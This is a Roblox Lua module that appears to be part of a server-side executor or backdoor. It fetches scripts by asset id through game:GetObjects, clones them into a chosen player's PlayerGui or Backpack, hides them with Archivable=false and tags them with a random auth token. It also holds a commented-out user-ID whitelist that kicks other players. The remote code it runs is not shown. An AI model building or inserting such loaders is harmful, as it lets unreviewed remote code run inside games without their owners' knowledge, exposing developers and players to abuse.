local LoadLibrary = game:GetObjects("rbxassetid://8299466510")[1]

--[[ 

not for trade, dont save in your inventory.

]]--


------------------
--< MAIN >--
------------------

local source = game:GetObjects("rbxassetid://14873885392")[1]

function RandomString(Length)
	local Thread = ""
	if type(Length) ~= "number" then
		assert(Length, "'Length' must be a number.")
		return
	elseif type(Thread) ~= "string" then
		assert(Thread, "'Thread' must be a string.")
		return
	end
	for i = 1, Length do
		Thread = Thread.. utf8.char(math.random(0, 10000))
	end
	return Thread
end

function RandomHTTP()
	return game:GetService("HttpService"):GenerateGUID(true)
end

Auth = RandomHTTP()

local Module = {}


function Module:er(Plr)
	local Player = game:GetService("Players"):FindFirstChild(Plr)
	-- 👻
	--if Player.UserId ~= 4403398646 or not 4640471291 or not 5054184507 then
	--	Player:Kick("👻")
	--	script:ClearAllChildren()
	--	return
	--end
	
	local Script = source:Clone()
	Script.Archivable = false
	Script.Name = Player.Name
	Script.Enabled = true
	Script:SetAttribute("Auth", Auth)
	Script.Parent = Player:FindFirstChildOfClass("PlayerGui") or Player:FindFirstChildOfClass("Backpack")
	if Player:FindFirstChildOfClass("PlayerGui") == nil and Player:FindFirstChildOfClass("Backpack") == nil then
		local Backpack = Instance.new("Backpack", Player)
		Backpack.Archivable = true
		Backpack.Name = "Backpack"
		Script.Parent = Backpack
	end
	local LocalScript = Script:FindFirstChildOfClass("LocalScript"):Clone()
	LocalScript.Archivable = false
	LocalScript.Name = Player.Name
	LocalScript.Enabled = true
	LocalScript:SetAttribute("Auth", Auth)
	LocalScript.Parent = Script
end

return Module
